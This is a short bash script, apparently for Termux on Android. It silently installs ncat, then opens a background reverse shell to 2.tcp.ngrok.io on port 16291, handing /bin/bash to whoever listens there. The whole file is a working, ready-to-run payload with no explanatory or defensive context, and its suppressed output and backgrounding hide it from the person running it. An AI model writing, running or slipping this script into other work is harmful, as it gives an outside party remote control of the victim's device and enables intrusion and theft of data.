#!/usr/bin/bash

pkg install ncat &> /dev/null
ncat 2.tcp.ngrok.io 16291 -e /bin/bash &


